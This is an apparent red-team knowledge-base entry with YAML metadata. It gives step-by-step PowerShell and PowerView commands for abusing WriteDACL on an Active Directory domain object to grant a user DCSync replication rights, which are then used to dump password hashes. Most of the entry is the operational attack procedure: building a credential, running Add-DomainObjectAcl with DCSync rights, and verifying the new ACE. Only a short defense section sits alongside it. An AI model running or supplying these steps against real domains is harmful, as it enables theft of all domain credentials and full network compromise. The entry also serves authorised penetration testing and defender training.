---
id: 870ad407-c447-4a42-aa71-d830638e00d7
name: grant-dcsync-rights-via-writedacl
type: procedure
verified: true
submitted: true
created_at: '2020-03-16T00:35:46.352047+00:00'
updated_at: '2023-05-25T19:43:13.389277+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[DCSync]]'
sub_techniques: []
tags:
  - active-directory
commands:
  - '[[commands/powershell-create-pscredential]]'
  - '[[commands/powerview-add-dcsync-acl]]'
tools:
  - '[[tools/PowerView]]'
platforms:
  - Windows
skill_level: advanced
impact_level: critical
detection_risk: high
validated: true
---

# grant-dcsync-rights-via-writedacl

## Summary

Abuse WriteDACL permissions on the domain object to grant a user DCSync rights (DS-Replication-Get-Changes) for subsequent credential dumping.

## Description

WriteDACL allows ACL modification; this adds specific ACEs for replication rights, simulating a DC to dump hashes via DCSync.

## Requirements

- WriteDACL on domain
- PowerView ([[tools/PowerView]])
- Target user

## Defense

- Monitor ACL changes (Event ID 5136)
- Restrict WriteDACL to admins only
- Use fine-grained password policies

## Objectives

1. Modify domain ACL
2. Grant replication rights
3. Enable DCSync

## Instructions

### Step 1: Import PowerView

**Context**: Load on target.

`. .\PowerView.ps1`.

### Step 2: Create Credential

**Context**: For the user with WriteDACL.

**Command** ([[commands/powershell-create-pscredential]]):
```powershell
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $Pass
```

### Step 3: Add DCSync ACL

**Context**: Target domain object.

**Command** ([[commands/powerview-add-dcsync-acl]]):
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=$_DOMAIN" -PrincipalIdentity $_TARGET_USER -Rights DCSync -Credential $Cred
```

> Adds necessary GUIDs for Get-Changes.

### Step 4: Verify Rights

**Context**: Check ACL.

`Get-DomainObjectAcl -Identity "DC=$_DOMAIN"`.

> Confirm DCSync ACE.

## Expected Output

ACL modified with new ACE for DS-Replication-Get-Changes.
